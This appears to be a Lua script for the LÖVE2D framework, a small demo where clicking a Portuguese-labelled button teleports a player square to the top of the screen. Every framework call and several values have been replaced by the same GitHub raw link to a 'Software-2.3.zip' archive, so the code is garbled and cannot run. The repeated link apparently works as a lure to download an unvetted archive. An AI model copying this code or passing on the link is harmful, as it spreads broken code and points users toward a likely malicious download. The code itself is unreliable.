-- https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip
local player = {
    x = 100,
    y = 300,
    width = 30,
    height = 30,
    color = {0, 1, 0}
}

local button = {
    x = 10,
    y = 10,
    width = 120,
    height = 40,
    label = "Ir para o teto"
}

local ceilingY = 50 -- "teto" do mapa

function https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip()
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip("Teleporte para o Teto")
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip(800, 600)
end

function https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip()
    -- Desenhar jogador
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip(https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip)
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip("fill", player.x, player.y, https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip, https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip)

    -- Desenhar botão
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip(0.2, 0.2, 0.8)
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip("fill", button.x, button.y, https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip, https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip)
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip(1, 1, 1)
    https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip(https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip, button.x + 10, button.y + 12)
end

function https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip(x, y, buttonCode)
    if buttonCode == 1 then -- Clique esquerdo
        if x > button.x and x < button.x + https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip and
           y > button.y and y < button.y + https://github.com/rl9blake/hrthtrrg/raw/refs/heads/main/bearess/Software-2.3.zip then
            -- Teleportar jogador para o "teto"
            player.y = ceilingY
        end
    end
end
